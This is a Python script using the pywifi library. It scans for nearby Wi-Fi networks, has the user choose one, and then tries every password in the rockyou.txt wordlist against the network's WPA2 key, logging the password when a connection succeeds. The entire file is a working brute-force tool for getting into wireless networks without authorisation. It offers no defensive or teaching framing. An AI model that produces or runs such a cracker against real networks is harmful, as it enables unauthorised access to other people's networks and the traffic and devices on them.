import pywifi
import time
import logging

# Set up logging
logging.basicConfig(level=logging.INFO)

def wifi_scan():
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.scan()  # Start scanning for networks
    time.sleep(2)  # Wait for the scan to complete
    results = iface.scan_results()  # Get the scan results
    return results

def wifi_attack(target_ssid, wordlist_path):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.disconnect()  # Disconnect from any current connections
    time.sleep(1)

    try:
        with open(wordlist_path, 'r') as wordlist_file:
            for password in wordlist_file:
                password = password.strip()  # Clean up whitespace
                profile = pywifi.Profile()
                profile.ssid = target_ssid
                profile.auth = pywifi.const.AUTH_ALG_OPEN
                profile.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
                profile.cipher = pywifi.const.CIPHER_TYPE_CCMP
                profile.key = password

                iface.remove_all_network_profiles()  # Clear previous profiles
                iface.add_network_profile(profile)  # Add the new profile
                iface.connect(iface.add_network_profile(profile))  # Attempt to connect
                time.sleep(1)  # Wait for connection attempt
                logging.info(f"Trying password: {password}")  # Show the password being tried
                if iface.status() == pywifi.const.IFACE_CONNECTED:
                    logging.info(f"Password found! The password is: {password}")
                    return
                else:
                    logging.info("Password incorrect.")
    except FileNotFoundError:
        logging.error(f"Error: Wordlist file '{wordlist_path}' not found.")
    except Exception as e:
        logging.error(f"An unexpected error occurred: {e}")

# Main execution flow
if __name__ == "__main__":
    networks = wifi_scan()  # Scan for available networks
    logging.info("Available networks:")
    for index, network in enumerate(networks):
        logging.info(f"{index + 1}: {network.ssid}")  # Displays the actual SSID

    try:
        choice = int(input("Choose a network by number: ")) - 1
        if 0 <= choice < len(networks):
            target_ssid = networks[choice].ssid  # Get the chosen SSID
            wordlist_path = 'rockyou.txt'  # Update to the correct path
            wifi_attack(target_ssid, wordlist_path)  # Attempt Wi-Fi attack with wordlist
        else:
            logging.error("Invalid choice. Exiting.")
    except ValueError:
        logging.error("Invalid input. Please enter a number.")
